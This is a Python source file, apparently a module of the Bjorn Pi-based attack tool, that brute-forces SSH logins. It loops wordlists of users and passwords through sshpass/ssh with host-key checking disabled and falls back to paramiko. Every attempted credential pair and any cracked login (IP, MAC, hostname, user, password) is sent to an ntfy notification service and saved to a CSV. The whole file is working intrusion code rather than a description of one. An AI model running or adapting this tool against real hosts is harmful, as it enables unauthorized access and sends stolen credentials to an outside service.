"""
ssh_connector.py - SSH bruteforce using subprocess instead of paramiko threads.
Avoids RuntimeError: can't start new thread on Pi Zero by never spawning
paramiko transport threads. Uses sshpass + ssh system binary instead.
"""

import os
import csv
import subprocess
import threading
import logging
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
from shared import SharedData
from logger import Logger
from ntfy import send_ntfy

logger = Logger(name="ssh_connector.py", level=logging.DEBUG)
logging.getLogger("paramiko").setLevel(logging.CRITICAL)

b_class  = "SSHBruteforce"
b_module = "ssh_connector"
b_status = "brute_force_ssh"
b_port   = 22
b_parent = None

# One host at a time — prevents parallel bruteforces across hosts
_ssh_host_lock = threading.Lock()


class SSHBruteforce:
    def __init__(self, shared_data):
        self.shared_data   = shared_data
        self.ssh_connector = SSHConnector(shared_data)
        logger.info("SSHConnector initialized.")

    def bruteforce_ssh(self, ip, port):
        logger.info(f"Running bruteforce_ssh on {ip}:{port}...")
        return self.ssh_connector.run_bruteforce(ip, port)

    def execute(self, ip, port, row, status_key):
        logger.info(f"Executing SSHBruteforce on {ip}:{port}...")
        self.shared_data.bjornorch_status = "SSHBruteforce"
        with _ssh_host_lock:
            success, results = self.bruteforce_ssh(ip, port)
        return 'success' if success else 'failed'


class SSHConnector:
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.users     = open(shared_data.usersfile,     "r").read().splitlines()
        self.passwords = open(shared_data.passwordsfile, "r").read().splitlines()
        self.sshfile   = shared_data.sshfile
        self.console   = Console()

        if not os.path.exists(self.sshfile):
            logger.info(f"File {self.sshfile} does not exist. Creating...")
            with open(self.sshfile, "w") as f:
                f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")

    def load_scan_file(self):
        """Load netkb CSV without pandas — no NumPy/OpenBLAS threads."""
        self.scan = []
        try:
            with open(self.shared_data.netkbfile, 'r') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    if row.get('Ports') and '22' in row['Ports']:
                        self.scan.append(row)
        except Exception as e:
            logger.error(f"Error loading scan file: {e}")
            self.scan = []

    def ssh_connect(self, ip, user, password):
        """
        Attempt SSH login using sshpass + ssh system binary.
        No paramiko = no internal transport threads = no thread exhaustion.
        """
        cmd = [
            "sshpass", "-p", password,
            "ssh",
            "-o", "StrictHostKeyChecking=no",
            "-o", "ConnectTimeout=3",
            "-o", "BatchMode=no",
            "-o", "NumberOfPasswordPrompts=1",
            "-p", "22",
            f"{user}@{ip}",
            "exit"
        ]
        try:
            result = subprocess.run(
                cmd,
                timeout=5,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            return result.returncode == 0
        except subprocess.TimeoutExpired:
            return False
        except FileNotFoundError:
            # sshpass not installed — fall back to paramiko single-shot
            logger.warning("sshpass not found, falling back to paramiko (no threads)")
            return self._paramiko_connect(ip, user, password)
        except Exception as e:
            logger.error(f"SSH connect error: {e}")
            return False

    def _paramiko_connect(self, ip, user, password):
        """
        Fallback: paramiko with use_none_transport to avoid spawning threads.
        Only used if sshpass is unavailable.
        """
        import paramiko
        import socket
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(
                ip,
                username=user,
                password=password,
                timeout=3,
                banner_timeout=10,
                auth_timeout=5,
                disabled_algorithms={"pubkeys": ["rsa-sha2-256", "rsa-sha2-512"]},
            )
            ssh.close()
            return True
        except (paramiko.AuthenticationException,
                paramiko.SSHException,
                socket.error,
                OSError):
            return False
        finally:
            try:
                ssh.close()
            except Exception:
                pass

    def run_bruteforce(self, adresse_ip, port):
        self.load_scan_file()

        match       = next((r for r in self.scan if r.get('IPs') == adresse_ip), {})
        mac_address = match.get('MAC Address', 'unknown')
        hostname    = match.get('Hostnames',   'unknown')

        total_tasks = len(self.users) * len(self.passwords)
        success_flag = False
        results      = []

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%")
        ) as progress:
            task_id = progress.add_task("[cyan]Bruteforcing SSH...", total=total_tasks)

            for user in self.users:
                if success_flag:
                    break
                for password in self.passwords:
                    if self.shared_data.orchestrator_should_exit:
                        logger.info("Exit signal — stopping bruteforce.")
                        return False, results

                    # ── log every attempt ──────────────────────────────
                    msg = f"SSH trying {adresse_ip}:{port} | {user}:{password}"
                    logger.info(msg)
                    send_ntfy(message=msg)
                    # ───────────────────────────────────────────────────

                    if self.ssh_connect(adresse_ip, user, password):
                        success_flag = True
                        results.append([mac_address, adresse_ip, hostname, user, password, port])
                        logger.info(f"SUCCESS {adresse_ip} | {user}:{password}")
                        msg = (f"SSH cracked {adresse_ip}:{port} | "
                               f"mac:{mac_address} | host:{hostname} | "
                               f"{user}:{password}")
                        send_ntfy(message=msg)
                        self._save_results(results)
                        # don't break — let it finish logging then exit loops
                        break

                    progress.update(task_id, advance=1)

        return success_flag, results

    def _save_results(self, results):
        if not results:
            return
        file_exists = os.path.exists(self.sshfile)
        with open(self.sshfile, 'a', newline='') as f:
            writer = csv.writer(f)
            if not file_exists:
                writer.writerow(['MAC Address','IP Address','Hostname','User','Password','Port'])
            for row in results:
                writer.writerow(row)
        self._remove_duplicates()

    def _remove_duplicates(self):
        try:
            with open(self.sshfile, 'r') as f:
                rows = list(csv.reader(f))
            if not rows:
                return
            seen = set()
            unique = [rows[0]]  # header
            for row in rows[1:]:
                key = tuple(row)
                if key not in seen:
                    seen.add(key)
                    unique.append(row)
            with open(self.sshfile, 'w', newline='') as f:
                csv.writer(f).writerows(unique)
        except Exception as e:
            logger.error(f"Error removing duplicates: {e}")


if __name__ == "__main__":
    shared_data = SharedData()
    try:
        ssh_bruteforce = SSHBruteforce(shared_data)
        logger.info("Starting SSH bruteforce on port 22")
        for row in shared_data.read_data():
            ip = row["IPs"]
            logger.info(f"Executing SSHBruteforce on {ip}...")
            ssh_bruteforce.execute(ip, b_port, row, b_status)
    except Exception as e:
        logger.error(f"Error: {e}")